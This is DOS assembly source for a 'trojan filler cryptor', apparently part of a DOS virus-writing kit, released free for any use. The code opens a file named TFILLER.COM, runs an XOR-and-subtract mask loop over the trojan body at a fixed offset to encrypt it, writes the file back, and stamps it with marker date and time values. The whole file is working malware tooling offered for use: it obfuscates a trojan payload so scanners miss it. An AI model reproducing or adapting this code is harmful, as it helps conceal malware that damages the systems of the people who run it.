COMMENT /
  (C) VBA Ltd. ALL RIGHTS RESERVED.
  E-mail: support@vba.com.by

  THIS PROGRAM IS FREE FOR COMMERCIAL AND NON-COMMERCIAL USE.
 
  REDISTRIBUTION AND USE IN SOURCE AND BINARY FORMS, WITH OR WITHOUT
  MODIFICATION, ARE PERMITTED.
 
  THIS SOFTWARE IS PROVIDED BY VBA LTD. ``AS IS'' AND
  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
  ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
  OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
  OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
  SUCH DAMAGE.
/

; TROJAN FILLER CRYPTOR
; (READ VBA.INC TROJAN_ TOPIC FOR DETAILED DESCRIPTION)

; REQUIRES:
; TASM.EXE -M TFCRYPT.ASM
; TLINK.EXE -T TFCRYPT.OBJ

.MODEL TINY
.CODE
.386P
.STARTUP

SUB_MASK	=	0ED8CH			;CRYPT MASK
TROJAN_LEN	=	0D9H			;TROJAN LENGTH FOR DE/CRYPTING
TCRYPT_START	=	1BH			;TROJAN OFFSET FOR DE/CRYPTING
TROJAN_NAME	EQU	'TFILLER.COM'		;FILENAME CONTAIN TROJAN
TROJAN_DATE	=	0FFH			;FROM VBA.INC
TROJAN_TIME	=	0			;FROM VBA.INC

		MOV	DX,OFFSET FILE
		MOV	AX,3D82H
		INT	21H
		JB	_EXIT
		XCHG	AX,BX
		MOV	CX,-1
		MOV	AH,3FH
		INT	21H
		PUSH	AX DX
		MOV	SI,OFFSET FILE+TCRYPT_START
		MOV	CX,TROJAN_LEN
		XOR	AX,AX
_NEXT:		XOR	AX,CX
		SUB	AX,SUB_MASK
		XOR	[SI],AX
		INC	SI
		LOOP	_NEXT
		XOR	DX,DX
		MOV	AX,4200H
		INT	21H
		POP	DX CX
		MOV	AH,40H
		INT	21H
		MOV	DX,TROJAN_DATE
		MOV	CX,TROJAN_TIME
		MOV	AX,5701H
		INT	21H
		MOV	AH,3EH
		INT	21H
_EXIT:		RETN

FILE		DB	TROJAN_NAME,0

		END
